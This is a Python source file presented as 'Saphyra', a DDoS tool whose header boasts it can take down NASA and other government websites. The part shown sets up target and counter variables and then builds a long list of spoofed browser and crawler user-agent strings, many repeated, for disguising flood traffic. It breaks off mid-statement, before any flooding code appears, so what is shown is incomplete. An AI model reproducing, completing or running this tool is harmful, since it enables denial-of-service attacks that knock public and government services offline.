# ----------------------------------------------------------------------------------------------
# Saphyra - DDoS Tool
#
# The DDoS Protocol is the most massive type of attack
# This tool can tangodown nasa and more gov websites
#
#
# author : Anonymous , version 1.0
# ----------------------------------------------------------------------------------------------
import urllib.request, urllib.error
import sys
import threading
import random
import re

# global params
url = ""
host = ""
headers_useragents = []
headers_referers = []
request_counter = 0
flag = 0
safe = 0


def inc_counter():
    global request_counter
    request_counter += 9999


def set_flag(val):
    global flag
    flag = val


def set_safe():
    global safe
    safe = 1


# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1;"
        " WOW64; Trident/5.0; FunWebProducts)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30;"
        " .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR"
        " 3.0.4506.2152; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1;"
        " Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR"
        " 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C;"
        " .NET4.0E)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like"
        " Gecko, Safari) OmniWeb/v563.57"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015;"
        " Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706"
        " K-Meleon/1.0"
    )
    headers_useragents.append(
        "Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g"
    )
    headers_useragents.append("Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)")
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like"
        " Gecko) Shiira/1.2.2 Safari/125"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300"
        " Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko)"
        " Safari/413"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 3.5.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)"
    )
    headers_useragents.append(
        "Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318"
        " Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10"
        " (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)"
    )
    headers_useragents.append(
        "Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC"
        " 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16"
        " (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16"
    )
    headers_useragents.append(
        "Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)"
    )
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)"
    )
    headers_useragents.append("Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221"
        " Firefox/3.5.7"
    )
    headers_useragents.append(
        "BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107"
        " UP.Link/6.2.3.15.0"
    )
    headers_useragents.append("Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser"
        " [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3"
        " (.NET CLR 2.0.50727)"
    )
    headers_useragents.append("Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows"
        " NT 5.1;)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720"
        " Minimo/0.007"
    )
    headers_useragents.append(
        "BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html)"
        " Gecko/2008032620"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot"
        " www.idealobserver.com"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; Arachmo)")
    headers_useragents.append("Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Baiduspider/2.0;"
        " +http://www.baidu.com/search/spider.html)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible;"
        " +http://www.become.com/site_owners.html)"
    )
    headers_useragents.append("BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)")
    headers_useragents.append(
        "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
    )
    headers_useragents.append(
        "Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; Yahoo! Slurp;"
        " http://help.yahoo.com/help/us/ysearch/slurp)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; YodaoBot/1.0;"
        " http://www.yodao.com/help/webmaster/spider/; )"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net;"
        " http://www.WISEnutbot.com)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML,"
        " like Gecko)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser"
        " 1.98.744; .NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo"
        " Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;"
        " Avant Browser)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser;"
        " GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1;"
        " .NET CLR 3.5.30729; .NET CLR 3.0.30618)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR"
        " 1.1.4322; .NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like"
        " Gecko, Safari/419.3) Cheshire/1.0.ALPHA"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like"
        " Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML,"
        " like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1"
    )
    headers_useragents.append(
        "Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML,"
        " like Gecko) Version/7.0.3 Safari/7046A194A"
    )
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 3.55)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 2.00)")
    headers_useragents.append("Mozilla/5.0 (PLAYSTATION 3; 1.00)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0"
    )
    headers_useragents.append(
        "Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)"
    )
    headers_useragents.append("SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)")
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append(
        "iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)")
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (FM Scene 4.6.1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401"
        " Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) "
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004"
        " Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " {1C69E7AA-C14E-200E-5A77-8EAB2D667A07})"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=none;"
        " freenet DSL 1.1; (none))"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 5.5; Windows 98)")
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.1) Gecko/20060111"
        " Firefox/1.5.0.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;"
        " snprtz|S26320700000083|2600#Service Pack 1#2#5#154321|isdn)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Alexa Toolbar; mxie;"
        " .NET CLR 1.1.4322)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/417.9 (KHTML, like"
        " Gecko) Safari/417.8"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12) Gecko/20051010"
        " Firefox/1.0.7 (Ubuntu package 1.0.7)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like"
        " Gecko) Chrome/4.0.219.6 Safari/532.1"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2;"
        " .NET CLR 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET"
        " CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR"
        " 2.0.50727; InfoPath.2)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)"
    )
    headers_useragents.append("Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)")
    headers_useragents.append(
        "Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51"
    )
    headers_useragents.append(
        "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913"
        " Firefox/3.5.3"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 2.0.50727)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824"
        " Firefox/3.5.3 (.NET CLR 3.5.30729)"
    )
    headers_useragents.append(
        "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718"
        " Firefox/3.5.1 (.NET CLR 3.0.04506.648)"
    )
    headers_useragents.append(
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727;"
        " .NET4.0C; .NET4.0E"
    )
    headers_useragents.append(
